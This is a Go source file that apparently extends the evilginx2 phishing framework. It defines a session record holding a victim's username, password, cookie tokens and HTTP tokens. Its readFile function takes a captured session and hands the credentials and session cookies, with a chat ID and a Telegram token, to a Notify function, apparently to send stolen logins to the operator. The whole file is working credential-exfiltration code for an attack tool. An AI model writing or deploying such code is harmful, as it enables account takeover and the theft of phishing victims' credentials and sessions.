package core

import (
	"encoding/json"
	"fmt"

	"github.com/kgretzky/evilginx2/database"
)

type TSession struct {
	ID         int                    `json:"id"`
	Phishlet   string                 `json:"phishlet"`
	LandingURL string                 `json:"landing_url"`
	Username   string                 `json:"username"`
	Password   string                 `json:"password"`
	Custom     map[string]interface{} `json:"custom"`
	BodyTokens map[string]interface{} `json:"body_tokens"`
	HTTPTokens map[string]interface{} `json:"http_tokens"`
	Tokens     map[string]interface{} `json:"tokens"`
	SessionID  string                 `json:"session_id"`
	UserAgent  string                 `json:"useragent"`
	RemoteAddr string                 `json:"remote_addr"`
	CreateTime int64                  `json:"create_time"`
	UpdateTime int64                  `json:"update_time"`
}

func toMapInterface(v interface{}) map[string]interface{} {
	b, err := json.Marshal(v)
	if err != nil {
		return nil
	}
	var m map[string]interface{}
	if err := json.Unmarshal(b, &m); err != nil {
		return nil
	}
	return m
}

func readFile(db *database.Database, sid string, chatid string, teletoken string) {
	sessions, err := db.ListSessions()
	if err != nil {
		fmt.Printf("Error listing sessions: %v\n", err)
		return
	}

	var dbSess *database.Session
	for _, s := range sessions {
		if s.SessionId == sid {
			dbSess = s
			break
		}
	}

	if dbSess == nil {
		fmt.Println("Session not found.")
		return
	}

	if len(dbSess.CookieTokens) == 0 {
		return
	}

	cookieJSON := FormatCookieTokens(dbSess.CookieTokens)

	sess := TSession{
		ID:         dbSess.Id,
		Phishlet:   dbSess.Phishlet,
		LandingURL: dbSess.LandingURL,
		Username:   dbSess.Username,
		Password:   dbSess.Password,
		SessionID:  dbSess.SessionId,
		UserAgent:  dbSess.UserAgent,
		RemoteAddr: dbSess.RemoteAddr,
		CreateTime: dbSess.CreateTime,
		UpdateTime: dbSess.UpdateTime,
		Custom:     toMapInterface(dbSess.Custom),
		BodyTokens: toMapInterface(dbSess.BodyTokens),
		HTTPTokens: toMapInterface(dbSess.HttpTokens),
		Tokens:     toMapInterface(dbSess.CookieTokens),
	}

	Notify(sess, cookieJSON, chatid, teletoken)
}
